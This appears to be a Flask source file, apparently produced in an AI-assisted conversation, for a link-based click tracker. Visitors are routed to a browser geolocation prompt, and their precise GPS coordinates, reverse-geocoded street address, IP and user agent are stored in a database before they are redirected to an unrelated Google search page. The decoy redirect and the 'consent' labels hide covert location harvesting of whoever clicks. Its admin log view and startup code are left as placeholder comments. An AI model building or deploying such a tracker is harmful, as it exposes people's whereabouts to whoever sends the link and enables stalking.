# app.py

from flask import Flask, request, redirect, render_template_string, render_template, Response
import datetime
import sqlite3 
import os 
from opencage.geocoder import OpenCageGeocode 
from ip_locator import get_location_from_ip # Required for fallback/logging

app = Flask(__name__)

# --- Configuration ---
# NOTE: Final destination after location is logged
FINAL_DESTINATION_URL = "https://www.google.com/search?q=location+based+facility+provided"
DATABASE_FILE = 'click_tracker.db'

# Use environment variable for secure API key (MANDATORY for deployment)
OPENCAGE_API_KEY = os.environ.get("OPENCAGE_API_KEY", "MISSING")

# Initialize the OpenCage client for Reverse Geocoding
if OPENCAGE_API_KEY != "MISSING":
    geocoder = OpenCageGeocode(OPENCAGE_API_KEY)
else:
    geocoder = None

# --- Simplified Geocoding (Required for Saving Address) ---
def get_address_from_coords(lat, lon):
    if not geocoder:
        return "API Key Missing"
    try:
        results = geocoder.reverse_geocode(lat, lon, limit=1)
        if results and results[0]['formatted']:
            return results[0]['formatted']
        return "Address Not Found"
    except Exception:
        return "Geocoding API Error"

# --- Database Setup and Logging Functions (Same as final version) ---
def init_db():
    # ... (code for database creation with columns: lat, lon, source, etc.)
    # For this system, the 'email' and 'source' columns are still needed for logging integrity.
    conn = sqlite3.connect(DATABASE_FILE)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS clicks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT,
            ip_address TEXT,
            country TEXT,
            city TEXT,
            latitude REAL,
            longitude REAL,
            source TEXT, 
            email TEXT,
            user_agent TEXT
        )
    """)
    conn.commit()
    conn.close()

def log_click_data(ip, location, user_agent, source="GPS", email="USER_CONSENT"): 
    # This logging function is simplified for the precise GPS goal
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    data = (timestamp, ip, location.get('country', 'N/A'), location.get('city', 'N/A'), 
            location.get('latitude'), location.get('longitude'), source, email, user_agent)

    try:
        conn = sqlite3.connect(DATABASE_FILE)
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO clicks (timestamp, ip_address, country, city, latitude, longitude, source, email, user_agent) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, data)
        conn.commit()
        conn.close()
        print(f"--- LOGGED ({source}) --- GPS Data Saved.")
    except sqlite3.Error as e:
        print(f"SQLite error during logging: {e}")


# --- STARTING POINT: The Link the User Clicks ---
@app.route('/track_consent_location')
def track_consent_location():
    """Redirects user to the page that triggers the browser's location prompt."""
    user_ip = request.remote_addr 
    user_agent = request.headers.get('User-Agent', 'Unknown')
    
    # We pass the minimal required data to the consent page
    return redirect(f"/request_location?ip={user_ip}&ua={user_agent}")


# --- CONSENT PAGE: Triggers the "Allow" Pop-up ---
@app.route('/request_location')
def request_location():
    # Renders the HTML file with JavaScript that asks for location
    return render_template('request_location.html', 
                           user_ip=request.args.get('ip'), 
                           user_agent=request.args.get('ua'),
                           # Note: The email is set to 'CONSENT_NEEDED' for simplicity
                           email="USER_CONSENT") 


# --- GPS DATA RECEIVED (Latitude and Longitude are captured) ---
@app.route('/location_received')
def location_received():
    ip, ua = request.args.get('ip'), request.args.get('ua')
    lat, lon = request.args.get('lat'), request.args.get('lon')
    
    # 1. Convert coords to readable address
    full_address = get_address_from_coords(float(lat), float(lon))
    
    location_data = {
        "country": "GPS_CONSENT", # New Source Type
        "city": full_address, 
        "latitude": float(lat), 
        "longitude": float(lon)
    }

    # 2. Log the Precise GPS data
    log_click_data(ip, location_data, ua, source="GPS_CONSENT")
    
    return redirect(FINAL_DESTINATION_URL)


# --- FALLBACK (User Denied/Failed) ---
@app.route('/fallback')
def fallback():
    # Log that the user did not consent
    log_click_data(
        ip=request.args.get('ip'), 
        location={"country": "DENIED", "city": "NO_GPS_CONSENT", "latitude": None, "longitude": None}, 
        user_agent=request.args.get('ua'), 
        source="CONSENT_DENIED"
    )
    return redirect(FINAL_DESTINATION_URL)


# --- Admin View Logs and Main Execution (Same as final version) ---
# NOTE: You will need the /view_logs route here to see the data.
# NOTE: You will need the if __name__ == '__main__': block here to run the app.

# ... (Insert the full view_logs function and if __name__ block from your final code here) ...
# ... (Use the final app.py code from the last answer to ensure all necessary helper functions are present) ...